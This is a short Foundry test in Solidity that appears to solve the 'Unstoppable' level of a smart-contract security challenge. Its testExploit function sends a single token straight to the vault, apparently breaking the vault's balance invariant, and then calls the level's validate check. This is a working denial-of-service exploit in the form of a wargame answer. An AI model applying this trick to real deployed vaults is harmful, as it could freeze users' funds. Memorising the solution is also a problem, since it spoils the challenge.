// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/unstoppable/UnstoppableLevel.sol";

interface IToken {
  function transfer(address, uint256) external;
}

contract UnstoppableTest is Test {
  UnstoppableLevel internal level = new UnstoppableLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    IToken token = IToken(address(level.token()));
    token.transfer(address(level.vault()), 1);

    level.validate();
  }
}
